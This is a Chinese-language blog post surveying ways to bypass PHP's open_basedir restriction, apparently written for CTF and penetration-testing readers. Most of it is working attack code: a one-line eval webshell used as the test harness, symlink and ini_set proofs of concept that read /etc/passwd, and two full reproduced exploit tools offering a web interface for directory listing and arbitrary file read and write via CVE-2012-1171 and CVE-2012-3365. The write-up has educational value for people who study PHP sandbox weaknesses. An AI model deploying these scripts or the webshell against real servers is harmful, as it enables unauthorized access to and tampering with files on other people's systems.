---
layout:     post                    # 使用的布局（不需要改）
title:      open_basedir绕过               # 标题 
subtitle:    #副标题
date:       2020-07-10              # 时间
author:     Von                      # 作者
header-img: img/post-bg-universe.jpg    #这篇文章标题背景图片
catalog: true                       # 是否归档
tags:                               #标签
    - PHP
    - Web

---

# 什么是open_basedir
Open_basedir是PHP设置中为了防御PHP跨目录进行文件（目录）读写的方法，所有PHP中有关文件读、写的函数都会经过open_basedir的检查。Open_basedir实际上是一些目录的集合，在定义了open_basedir以后，php可以读写的文件、目录都将被限制在这些目录中。
一般情况下，我们最多可以绕过open_basedir的限制对其进行列目录。绕过open_basedir进行读写文件危害较大，在php5.3以后很少有能够绕过open_basedir读写文件的方法。

# 本篇测试脚本
本篇所用到的php测试文件是一个一句话木马
```php
<?php eval($_GET['shell']);?>
```
并且open_basedir设置为/var/www/html
![](/blog_img/open_basedir_1.png)
我们先来看下open_basedir起到的作用，以scandir函数为例。当我们sandir的目录为当前目录时，可以正常输出结果。
![](/blog_img/open_basedir_2.png)
当尝试输出上层目录时，无法正常输出。
![](/blog_img/open_basedir_3.png)

# 通过系统命令执行绕过
但是open_basedir对系统函数并没有做相关的限制，我们用系统函数可以绕过。
![](/blog_img/open_basedir_4.png)

# 利用glob://绕过
## glob://伪协议
glob://协议是php5.3.0以后一种查找匹配的文件路径模式。  
官方给出了一个示例用法  
```php
<?php
// 循环 ext/spl/examples/ 目录里所有 *.php 文件
// 并打印文件名和文件尺寸
$it = new DirectoryIterator("glob://ext/spl/examples/*.php");
foreach($it as $f) {
    printf("%s: %.1FK\n", $f->getFilename(), $f->getSize()/1024);
}
?
```
glob://伪协议需要结合其他函数方法才能列目录，单纯传参glob://是没办法列目录的。
## DirectoryIterator+glob://
DirectoryIterator是php5中增加的一个类，为用户提供一个简单的查看目录的接口，利用此方法可以绕过open_basedir限制。(但是似乎只能用于Linux下)  
脚本差不多如下:
```php
<?php
$a = new DirectoryIterator("glob:///*");
foreach($a as $f){
    echo($f->__toString().'<br>');
}
?>
```
可以看到,成功列出目录:
![](/blog_img/open_basedir_5.png)
当传入的参数为glob:///\*时会列出根目录下的文件，传入参数为glob://\*时会列出open_basedir允许目录下的文件。

## scandir()+glob://
这是看TCTF WP里面的一种方法，最为简单明了:
代码如下:
```php
<?php
var_dump(scandir('glob:///*'));
>
```
![](/blog_img/open_basedir_6.png)
这种方法也只能列出根目录和open_basedir允许目录下的文件。

## opendir()+readdir()+glob://
脚本如下:
```php
<?php
if ( $b = opendir('glob:///*') ) {
    while ( ($file = readdir($b)) !== false ) {
        echo $file."<br>";
    }
    closedir($b);
}
?>
```
![](/blog_img/open_basedir_7.png)
同理，这种方法也只能列出根目录和open_basedir允许目录下的文件。  
可以看到，上面三种和glob://相关的协议，最大的缺陷就是只能列目录，而且还只能列根目录和open_basedir允许目录的内容。  

# 利用symlink()绕过
## symlink()函数
symlink()对于已有的target建立一个名为link的符号连接。  
用法如下:  
- symlink (string \$target,string \$link) symlink()对于已有的 target(一般情况下受限于open_basedir)建立一个名为link的符号连接。
- 成功时返回TRUE， 或者在失败时返回FALSE。
示例用法如下:

``` php
<?php
$target = 'uploads.php';
$link = 'uploads';
symlink($target, $link);

echo readlink($link);
# 将会输出'uploads.php'这个字符串
?>
```
## POC及原理分析
假如我们要读取/etc/passwd,对应的POC为:
```php
<?php
mkdir("a");
chdir("a");
mkdir("b");
chdir("b");
mkdir("c");
chdir("c");
mkdir("d");
chdir("d");
chdir("..");
chdir("..");
chdir("..");
chdir("..");
symlink("a/b/c/d","Von");
symlink("Von/../../../../etc/passwd","exp");
unlink("Von");
mkdir("Von");
system('cat exp');
```
![](/blog_img/open_basedi_8.png)
成功读取/etc/passwd.  
我们来分析下这个POC
**1.** 首先前面8步,实现了创建a/b/c/d目录,并把当前目录移动到该目录下面。  
**2.** 接着symlink("a/b/c/d","Von")创建了一个符号文件Von,指向了a/b/c/d  
**3.** 接着symlink("Von/../../../../etc/passwd","exp"),由于此时Von仍然是一个符号文件,所以等价于symlink("a/b/c/d/../../../../etc/passwd","exp"),由于此时a/b/c/d/../../../../的结果等于/var/www/html,符合open_basedir的限制,因此软链接可以被成功建立  
**4.** 但是之后我们删除了Von这个软链接，并且建立了一个真实的文件夹Von,所以此时上面symlink("Von/../../../../etc/passwd","exp")中的Von不再是软链接而是一个真实的目录。从而达到跨目录访问的效果。
其实到了这一步，我们直接访问根目录下的exp文件能得到结果，我上面是为了让结果直观展示出来才利用使用了system('cat exp')来得到结果。(一般情况下system()是被禁的)
![](/blog_img/open_basedi_10.png)
给出两个大神的POC
```php
<?php
/*
* by phithon
* From https://www.leavesongs.com
* detail: http://cxsecurity.com/issue/WLB-2009110068
*/
header('content-type: text/plain');
error_reporting(-1);
ini_set('display_errors', TRUE);
printf("open_basedir: %s\nphp_version: %s\n", ini_get('open_basedir'), phpversion());
printf("disable_functions: %s\n", ini_get('disable_functions'));
$file = str_replace('\\', '/', isset($_REQUEST['file']) ? $_REQUEST['file'] : '/etc/passwd');
$relat_file = getRelativePath(__FILE__, $file);
$paths = explode('/', $file);
$name = mt_rand() % 999;
$exp = getRandStr();
mkdir($name);
chdir($name);
for($i = 1 ; $i < count($paths) - 1 ; $i++){
    mkdir($paths[$i]);
    chdir($paths[$i]);
}
mkdir($paths[$i]);
for ($i -= 1; $i > 0; $i--) { 
    chdir('..');
}
$paths = explode('/', $relat_file);
$j = 0;
for ($i = 0; $paths[$i] == '..'; $i++) { 
    mkdir($name);
    chdir($name);
    $j++;
}
for ($i = 0; $i <= $j; $i++) { 
    chdir('..');
}
$tmp = array_fill(0, $j + 1, $name);
symlink(implode('/', $tmp), 'tmplink');
$tmp = array_fill(0, $j, '..');
symlink('tmplink/' . implode('/', $tmp) . $file, $exp);
unlink('tmplink');
mkdir('tmplink');
delfile($name);
$exp = dirname($_SERVER['SCRIPT_NAME']) . "/{$exp}";
$exp = "http://{$_SERVER['SERVER_NAME']}{$exp}";
echo "\n-----------------content---------------\n\n";
echo file_get_contents($exp);
delfile('tmplink');

function getRelativePath($from, $to) {
  // some compatibility fixes for Windows paths
  $from = rtrim($from, '\/') . '/';
  $from = str_replace('\\', '/', $from);
  $to   = str_replace('\\', '/', $to);

  $from   = explode('/', $from);
  $to     = explode('/', $to);
  $relPath  = $to;

  foreach($from as $depth => $dir) {
    // find first non-matching dir
    if($dir === $to[$depth]) {
      // ignore this directory
      array_shift($relPath);
    } else {
      // get number of remaining dirs to $from
      $remaining = count($from) - $depth;
      if($remaining > 1) {
        // add traversals up to first matching dir
        $padLength = (count($relPath) + $remaining - 1) * -1;
        $relPath = array_pad($relPath, $padLength, '..');
        break;
      } else {
        $relPath[0] = './' . $relPath[0];
      }
    }
  }
  return implode('/', $relPath);
}

function delfile($deldir){
    if (@is_file($deldir)) {
        @chmod($deldir,0777);
        return @unlink($deldir);
    }else if(@is_dir($deldir)){
        if(($mydir = @opendir($deldir)) == NULL) return false;
        while(false !== ($file = @readdir($mydir)))
        {
            $name = File_Str($deldir.'/'.$file);
            if(($file!='.') && ($file!='..')){delfile($name);}
        } 
        @closedir($mydir);
        @chmod($deldir,0777);
        return @rmdir($deldir) ? true : false;
    }
}

function File_Str($string)
{
    return str_replace('//','/',str_replace('\\','/',$string));
}

function getRandStr($length = 6) {
    $chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    $randStr = '';
    for ($i = 0; $i < $length; $i++) {
        $randStr .= substr($chars, mt_rand(0, strlen($chars) - 1), 1);
    }
    return $randStr;
}
```

```php
<?php
/*
PHP open_basedir bypass collection
Works with >= PHP5
By /fd, @filedescriptor(https://twitter.com/filedescriptor)
 */

// Assistant functions
function getRelativePath($from, $to) {
	// some compatibility fixes for Windows paths
	$from = rtrim($from, '\/') . '/';
	$from = str_replace('\\', '/', $from);
	$to = str_replace('\\', '/', $to);

	$from = explode('/', $from);
	$to = explode('/', $to);
	$relPath = $to;

	foreach ($from as $depth => $dir) {
		// find first non-matching dir
		if ($dir === $to[$depth]) {
			// ignore this directory
			array_shift($relPath);
		} else {
			// get number of remaining dirs to $from
			$remaining = count($from) - $depth;
			if ($remaining > 1) {
				// add traversals up to first matching dir
				$padLength = (count($relPath) + $remaining - 1) * -1;
				$relPath = array_pad($relPath, $padLength, '..');
				break;
			} else {
				$relPath[0] = './' . $relPath[0];
			}
		}
	}
	return implode('/', $relPath);
}

function fallback($classes) {
	foreach ($classes as $class) {
		$object = new $class;
		if ($object->isAvailable()) {
			return $object;
		}
	}
	return new NoExploit;
}

// Core classes
interface Exploitable {
	function isAvailable();
	function getDescription();
}

class NoExploit implements Exploitable {
	function isAvailable() {
		return true;
	}
	function getDescription() {
		return 'No exploit is available.';
	}
}

abstract class DirectoryLister implements Exploitable {
	var $currentPath;

	function isAvailable() {}
	function getDescription() {}
	function getFileList() {}
	function setCurrentPath($currentPath) {
		$this->currentPath = $currentPath;
	}
	function getCurrentPath() {
		return $this->currentPath;
	}
}

class GlobWrapperDirectoryLister extends DirectoryLister {
	function isAvailable() {
		return stripos(PHP_OS, 'win') === FALSE && in_array('glob', stream_get_wrappers());
	}
	function getDescription() {
		return 'Directory listing via glob pattern';
	}
	function getFileList() {
		$file_list = array();
		// normal files
		$it = new DirectoryIterator("glob://{$this->getCurrentPath()}*");
		foreach ($it as $f) {
			$file_list[] = $f->__toString();
		}
		// special files (starting with a dot(.))
		$it = new DirectoryIterator("glob://{$this->getCurrentPath()}.*");
		foreach ($it as $f) {
			$file_list[] = $f->__toString();
		}
		sort($file_list);
		return $file_list;
	}
}

class RealpathBruteForceDirectoryLister extends DirectoryLister {
	var $characters = 'abcdefghijklmnopqrstuvwxyz0123456789-_'
	, $extension = array()
	, $charactersLength = 38
	, $maxlength = 3
	, $fileList = array();

	function isAvailable() {
		return ini_get('open_basedir') && function_exists('realpath');
	}
	function getDescription() {
		return 'Directory listing via brute force searching with realpath function.';
	}
	function setCharacters($characters) {
		$this->characters = $characters;
		$this->charactersLength = count($characters);
	}
	function setExtension($extension) {
		$this->extension = $extension;
	}
	function setMaxlength($maxlength) {
		$this->maxlength = $maxlength;
	}
	function getFileList() {
		set_time_limit(0);
		set_error_handler(array(__CLASS__, 'handler'));
		$number_set = array();
		while (count($number_set = $this->nextCombination($number_set, 0)) <= $this->maxlength) {
			$this->searchFile($number_set);
		}
		sort($this->fileList);
		return $this->fileList;
	}
	function nextCombination($number_set, $length) {
		if (!isset($number_set[$length])) {
			$number_set[$length] = 0;
			return $number_set;
		}
		if ($number_set[$length] + 1 === $this->charactersLength) {
			$number_set[$length] = 0;
			$number_set = $this->nextCombination($number_set, $length + 1);
		} else {
			$number_set[$length]++;
		}
		return $number_set;
	}
	function searchFile($number_set) {
		$file_name = 'a';
		foreach ($number_set as $key => $value) {
			$file_name[$key] = $this->characters[$value];
		}
		// normal files
		realpath($this->getCurrentPath() . $file_name);
		// files with preceeding dot
		realpath($this->getCurrentPath() . '.' . $file_name);
		// files with extension
		foreach ($this->extension as $extension) {
			realpath($this->getCurrentPath() . $file_name . $extension);
		}
	}
	function handler($errno, $errstr, $errfile, $errline) {
		$regexp = '/File\((.*)\) is not within/';
		preg_match($regexp, $errstr, $matches);
		if (isset($matches[1])) {
			$this->fileList[] = $matches[1];
		}

	}
}

abstract class FileWriter implements Exploitable {
	var $filePath;

	function isAvailable() {}
	function getDescription() {}
	function write($content) {}
	function setFilePath($filePath) {
		$this->filePath = $filePath;
	}
	function getFilePath() {
		return $this->filePath;
	}
}

abstract class FileReader implements Exploitable {
	var $filePath;

	function isAvailable() {}
	function getDescription() {}
	function read() {}
	function setFilePath($filePath) {
		$this->filePath = $filePath;
	}
	function getFilePath() {
		return $this->filePath;
	}
}

// Assistant class for DOMFileWriter & DOMFileReader
class StreamExploiter {
	var $mode, $filePath, $fileContent;

	function stream_close() {
		$doc = new DOMDocument;
		$doc->strictErrorChecking = false;
		switch ($this->mode) {
		case 'w':
			$doc->loadHTML($this->fileContent);
			$doc->removeChild($doc->firstChild);
			$doc->saveHTMLFile($this->filePath);
			break;
		default:
		case 'r':
			$doc->resolveExternals = true;
			$doc->substituteEntities = true;
			$doc->loadXML("<!DOCTYPE doc [<!ENTITY file SYSTEM \"file://{$this->filePath}\">]><doc>&file;</doc>", LIBXML_PARSEHUGE);
			echo $doc->documentElement->firstChild->nodeValue;
		}
	}
	function stream_open($path, $mode, $options, &$opened_path) {
		$this->filePath = substr($path, 10);
		$this->mode = $mode;
		return true;
	}
	public function stream_write($data) {
		$this->fileContent = $data;
		return strlen($data);
	}
}

class DOMFileWriter extends FileWriter {
	function isAvailable() {
		return extension_loaded('dom') && (version_compare(phpversion(), '5.3.10', '<=') || version_compare(phpversion(), '5.4.0', '='));
	}
	function getDescription() {
		return 'Write to and create a file exploiting CVE-2012-1171 (allow overriding). Notice the content should be in well-formed XML format.';
	}
	function write($content) {
		// set it to global resource in order to trigger RSHUTDOWN
		global $_DOM_exploit_resource;
		stream_wrapper_register('exploit', 'StreamExploiter');
		$_DOM_exploit_resource = fopen("exploit://{$this->getFilePath()}", 'w');
		fwrite($_DOM_exploit_resource, $content);
	}
}

class DOMFileReader extends FileReader {
	function isAvailable() {
		return extension_loaded('dom') && (version_compare(phpversion(), '5.3.10', '<=') || version_compare(phpversion(), '5.4.0', '='));
	}
	function getDescription() {
		return 'Read a file exploiting CVE-2012-1171. Notice the content should be in well-formed XML format.';
	}
	function read() {
		// set it to global resource in order to trigger RSHUTDOWN
		global $_DOM_exploit_resource;
		stream_wrapper_register('exploit', 'StreamExploiter');
		$_DOM_exploit_resource = fopen("exploit://{$this->getFilePath()}", 'r');
	}
}

class SqliteFileWriter extends FileWriter {
	function isAvailable() {
		return is_writable(getcwd())
			&& (extension_loaded('sqlite3') || extension_loaded('sqlite'))
			&& (version_compare(phpversion(), '5.3.15', '<=') || (version_compare(phpversion(), '5.4.5', '<=') && PHP_MINOR_VERSION == 4));
	}
	function getDescription() {
		return 'Create a file with custom content exploiting CVE-2012-3365 (disallow overriding). Junk contents may be inserted';
	}
	function write($content) {
		$sqlite_class = extension_loaded('sqlite3') ? 'sqlite3' : 'SQLiteDatabase';
		mkdir(':memory:');
		$payload_path = getRelativePath(getcwd() . '/:memory:', $this->getFilePath());
		$payload = str_replace('\'', '\'\'', $content);
		$database = new $sqlite_class(":memory:/{$payload_path}");
		$database->exec("CREATE TABLE foo (bar STRING)");
		$database->exec("INSERT INTO foo (bar) VALUES ('{$payload}')");
		$database->close();
		rmdir(':memory:');
	}
}

// End of Core
?>
<?php
$action = isset($_GET['action']) ? $_GET['action'] : '';
$cwd = isset($_GET['cwd']) ? $_GET['cwd'] : getcwd();
$cwd = rtrim($cwd, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR;
$directorLister = fallback(array('GlobWrapperDirectoryLister', 'RealpathBruteForceDirectoryLister'));
$fileWriter = fallback(array('DOMFileWriter', 'SqliteFileWriter'));
$fileReader = fallback(array('DOMFileReader'));
$append = '';
?>
<style>
#panel {
  height: 200px;
  overflow: hidden;
}
#panel > pre {
  margin: 0;
  height: 200px;
}
</style>
<div id="panel">
<pre id="dl">
open_basedir: <span style="color: red"><?php echo ini_get('open_basedir') ? ini_get('open_basedir') : 'Off'; ?></span>
<form style="display:inline-block" action="">
<fieldset><legend>Directory Listing:</legend>Current Directory: <input name="cwd" size="100" value="<?php echo $cwd; ?>"><input type="submit" value="Go">
<?php if (get_class($directorLister) === 'RealpathBruteForceDirectoryLister'): ?>
<?php
$characters = isset($_GET['characters']) ? $_GET['characters'] : $directorLister->characters;
$maxlength = isset($_GET['maxlength']) ? $_GET['maxlength'] : $directorLister->maxlength;
$append = "&characters={$characters}&maxlength={$maxlength}";

$directorLister->setMaxlength($maxlength);
?>
Search Characters: <input name="characters" size="100" value="<?php echo $characters; ?>">
Maxlength of File: <input name="maxlength" size="1" value="<?php echo $maxlength; ?>">
<?php endif;?>
Description      : <strong><?php echo $directorLister->getDescription(); ?></strong>
</fieldset>
</form>
</pre>
<?php
$file_path = isset($_GET['file_path']) ? $_GET['file_path'] : '';
?>
<pre id="rf">
open_basedir: <span style="color: red"><?php echo ini_get('open_basedir') ? ini_get('open_basedir') : 'Off'; ?></span>
<form style="display:inline-block" action="">
<fieldset><legend>Read File :</legend>File Path: <input name="file_path" size="100" value="<?php echo $file_path; ?>"><input type="submit" value="Read">
Description: <strong><?php echo $fileReader->getDescription(); ?></strong><input type="hidden" name="action" value="rf">
</fieldset>
</form>
</pre>
<pre id="wf">
open_basedir: <span style="color: red"><?php echo ini_get('open_basedir') ? ini_get('open_basedir') : 'Off'; ?></span>
<form style="display:inline-block" action="">
<fieldset><legend>Write File :</legend>File Path   : <input name="file_path" size="100" value="<?php echo $file_path; ?>"><input type="submit" value="Write">
File Content: <textarea cols="70" name="content"></textarea>
Description : <strong><?php echo $fileWriter->getDescription(); ?></strong><input type="hidden" name="action" value="wf">
</fieldset>
</form>
</pre>
</div>
<a href="#dl">Directory Listing</a> | <a href="#rf">Read File</a> | <a href="#wf">Write File</a>
<hr>
<pre>
<?php if ($action === 'rf'): ?>
<plaintext>
<?php
$fileReader->setFilePath($file_path);
echo $fileReader->read();
?>
<?php elseif ($action === 'wf'): ?>
<?php
if (isset($_GET['content'])) {
	$fileWriter->setFilePath($file_path);
	$fileWriter->write($_GET['content']);
	echo 'The file should be written.';
} else {
	echo 'Something goes wrong.';
}
?>
<?php else: ?>
<ol>
<?php
$directorLister->setCurrentPath($cwd);
$file_list = $directorLister->getFileList();
$parent_path = dirname($cwd);

echo "<li><a href='?cwd={$parent_path}{$append}#dl'>Parent</a></li>";
if (count($file_list) > 0) {
	foreach ($file_list as $file) {
		echo "<li><a href='?cwd={$cwd}{$file}{$append}#dl'>{$file}</a></li>";
	}
} else {
	echo 'No files found. The path is probably not a directory.';
}
?>
</ol>
<?php endif;?>
```

# 利用ini_set()绕过
## ini_set()函数
ini_set()用来设置php.ini的值，在函数执行的时候生效，脚本结束后，设置失效。无需打开php.ini文件，就能修改配置。函数用法如下:
```php
ini_set ( string $varname , string $newvalue ) : string
```
- varname是需要设置的值
- newvalue是设置成为新的值
- 成功时返回旧的值，失败时返回 FALSE。

## POC
当前我们处在/var/www/html文件夹下，对应的POC为:
```php
<?php
mkdir('Von');  //创建一个目录Von
chdir('Von');  //切换到Von目录下
ini_set('open_basedir','..');  //把open_basedir切换到上层目录
chdir('..');  //以下这三步是把目录切换到根目录
chdir('..');
chdir('..');
ini_set('open_basedir','/');  //设置open_basedir为根目录(此时相当于没有设置open_basedir)
echo file_get_contents('/etc/passwd');  //读取/etc/passwd
```
可以看到，我们成功读取到了/etc/passwd
![](/blog_img/open_basedi_9.png)
至于POC的原理涉及到了PHP的底层实现，较为复杂，具体可以参考这几篇文章。  
[从PHP底层看open_basedir bypass](https://skysec.top/2019/04/12/%E4%BB%8EPHP%E5%BA%95%E5%B1%82%E7%9C%8Bopen-basedir-bypass/#poc%E6%B5%8B%E8%AF%95)  
[php open_basedir 绕过poc分析](https://hexo.imagemlt.xyz/post/php-bypass-open-basedir/)  
[bypass open_basedir的新方法](https://xz.aliyun.com/t/4720)  
这个我个人感觉是所有方法中最强的Payload了，思路很骚，操作也不难。(当然前提是没有被过滤掉相关函数hhhh)



# 利用SplFileInfo::getRealPath()类方法绕过
SplFileInfo类是PHP5.1.2之后引入的一个类，提供一个对文件进行操作的接口。我们在SplFileInfo的构造函数中传入文件相对路径，并且调用getRealPath即可获取文件的绝对路径。  
这个方法有个特点：完全没有考虑open_basedir。在传入的路径为一个不存在的路径时，会返回false；在传入的路径为一个存在的路径时，会正常返回绝对路径。脚本如下:
```php
<?php
$info = new SplFileInfo('/etc/passwd');
var_dump($info->getRealPath());
?>
```
当传入的路径存在时，返回路径。
![](/blog_img/open_basedir_10.png)
当传入的路径不存在时，返回False。
![](/blog_img/open_basedir_11.png)
但是如果我们完全不知道路径的情况下就和暴力猜解无异了，时间花费极高。在Windows系统下可以利用<>来列出所需目录下的文件，有P神的POC如下:
```php
<?php
ini_set('open_basedir', dirname(__FILE__));
printf("<b>open_basedir: %s</b><br />", ini_get('open_basedir'));
$basedir = 'D:/test/';
$arr = array();
$chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
for ($i=0; $i < strlen($chars); $i++) { 
    $info = new SplFileInfo($basedir . $chars[$i] . '<><');
    $re = $info->getRealPath();
    if ($re) {
        dump($re);
    }
}
function dump($s){
    echo $s . '<br/>';
    ob_flush();
    flush();
}
?>
```
当然由于<><是Windows特有的通配符。所以该POC只能在Windows环境下使用。Linux下只能暴力破解。

# 利用realpath()绕过
realpath()函数和SplFileInfo::getRealPath()作用类似。同样是可以得到绝对路径。函数定义如下:
```php
realpath ( string $path ) : string
```
当我们传入的路径是一个不存在的文件（目录）时，它将返回false；当我们传入一个不在open_basedir里的文件（目录）时，他将抛出错误（File is not within the allowed path(s)）。
同样，对于这个函数，我们在Windows下仍然能够使用通配符<>来列目录，有P神的脚本如下:
```php
<?php
ini_set('open_basedir', dirname(__FILE__));
printf("<b>open_basedir: %s</b><br />", ini_get('open_basedir'));
set_error_handler('isexists');
$dir = 'd:/test/';
$file = '';
$chars = 'abcdefghijklmnopqrstuvwxyz0123456789_';
for ($i=0; $i < strlen($chars); $i++) { 
    $file = $dir . $chars[$i] . '<><';
    realpath($file);
}
function isexists($errno, $errstr)
{
    $regexp = '/File\((.*)\) is not within/';
    preg_match($regexp, $errstr, $matches);
    if (isset($matches[1])) {
        printf("%s <br/>", $matches[1]);
    }
}
?>
```
realpath()和SplFileInfo::getRealPath()的区别在于,realpath()只有在启用了open_basedir()限制的情况下才能使用这种思路爆目录，而SplFileInfo::getRealPath()可以无视是否开启open_basedir进行列目录(当然，没有开启open_basedir也没必要花这么大的功夫来列目录了)

# 利用imageftbbox()绕过
GD库一般是PHP必备的扩展库之一，当中的imageftbbox()函数也可以起到像realpath()一样的列目录效果。  
其思想也和open_basedir类似。这个函数第三个参数是字体的路径。我发现当这个参数在open_basedir外的时候，当文件存在，则php会抛出“File(xxxxx) is not within the allowed path(s)”错误。但当文件不存在的时候会抛出“Invalid font filename”错误。
有POC如下:
```php
?php
ini_set('open_basedir', dirname(__FILE__));
printf("<b>open_basedir: %s</b><br />", ini_get('open_basedir'));
set_error_handler('isexists');
$dir = 'd:/test/';
$file = '';
$chars = 'abcdefghijklmnopqrstuvwxyz0123456789_';
for ($i=0; $i < strlen($chars); $i++) { 
    $file = $dir . $chars[$i] . '<><';
    //$m = imagecreatefrompng("zip.png");
    //imagefttext($m, 100, 0, 10, 20, 0xffffff, $file, 'aaa');
    imageftbbox(100, 100, $file, 'aaa');
}
function isexists($errno, $errstr)
{
    global $file;
    if (stripos($errstr, 'Invalid font filename') === FALSE) {
        printf("%s<br/>", $file);
    }
}
?>
```
但是貌似用这种方法进行列目录的话，只能一位一位猜解，具体可以参考P神的文章[PHP绕过open_basedir列目录的研究](https://www.leavesongs.com/PHP/php-bypass-open-basedir-list-directory.html#0x03-realpath)  
总之感觉是挺鸡肋的方法，而且和上面的两种方法类似，由于都使用了Windows的通配符，所以这些POC都只能在Windows下使用，Linux下只能暴力猜解。

# 利用bindtextdomain()绕过
## bindtextdomain()函数
bindtextdomain是php下绑定domain到某个目录的函数。用法如下:
```php
bindtextdomain ( string $domain , string $directory ) : string
```
第一个参数随便传都行，主要出在第二个参数上，当第二个参数即目录存在时，会返回目录的路径，当目录不存在时，会返回False。故有脚本如下:
```php
<?php
$re = bindtextdomain('xxx', $_GET['dir']);
var_dump($re);
?>
```
这个方法只能用暴力猜解的方法来判断文件是否存在，而且只能在Linux环境下使用，可以说相当鸡肋了。

# 总结
emmm，不知不觉又水完了一篇文章，就感觉大多数对open_basedir的绕过都还是存在着各种各样的局限，大部分只能列目录就不说了，而且还存在着对PHP版本有限制、Linux(Windows)不能通杀、需要采用暴力破解的问题。  
反正我感觉在实战或者是CTF中，遇到了open_basedir的限制，有时不比在绕过open_basedir上死磕，或许直接寻找有无RCE的方法有时反倒能够让你柳暗花明(毕竟执行系统函数就是绕过open_basedir的一种方法)  
最后说一句，PHITHON，永远滴神！  

# 参考文章
[PHP绕过open_basedir列目录的研究](https://www.leavesongs.com/PHP/php-bypass-open-basedir-list-directory.html#0x03-realpath)  
[php5全版本绕过open_basedir读文件脚本](https://www.leavesongs.com/bypass-open-basedir-readfile.html)  
[浅谈几种Bypass open_basedir的方法](https://www.mi1k7ea.com/2019/07/20/%E6%B5%85%E8%B0%88%E5%87%A0%E7%A7%8DBypass-open-basedir%E7%9A%84%E6%96%B9%E6%B3%95/)  
[PHP绕过open_basedir限制操作文件的三种方法](https://www.jianshu.com/p/cf2cd07d02cf)  






